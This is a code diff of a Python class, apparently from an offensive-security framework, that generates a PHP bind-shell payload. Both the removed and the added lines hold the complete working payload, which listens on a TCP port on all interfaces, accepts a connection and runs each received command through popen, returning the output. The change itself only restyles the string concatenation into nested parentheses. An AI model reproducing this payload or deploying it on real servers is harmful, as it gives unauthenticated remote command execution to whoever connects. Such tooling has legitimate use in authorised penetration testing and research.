@@ -22,16 +22,24 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" +
-            "socket_bind($s,\"0.0.0.0\",{});".format(self.rport) +
-            "socket_listen($s,1);" +
-            "$cl=socket_accept($s);" +
-            "while(1){" +
-            "if(!socket_write($cl,\"$ \",2))exit;" +
-            "$in=socket_read($cl,100);" +
-            "$cmd=popen(\"$in\",\"r\");" +
-            "while(!feof($cmd)){" +
-            "$m=fgetc($cmd);" +
-            "socket_write($cl,$m,strlen($m));" +
-            "}}"
-        )
+            (
+                (
+                    (
+                        (
+                            (
+                                (
+                                    f'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{self.rport});socket_listen($s,1);$cl=socket_accept($s);'
+                                    + "while(1){"
+                                )
+                                + "if(!socket_write($cl,\"$ \",2))exit;"
+                            )
+                            + "$in=socket_read($cl,100);"
+                        )
+                        + "$cmd=popen(\"$in\",\"r\");"
+                    )
+                    + "while(!feof($cmd)){"
+                )
+                + "$m=fgetc($cmd);"
+            )
+            + "socket_write($cl,$m,strlen($m));"
+        ) + "}}"
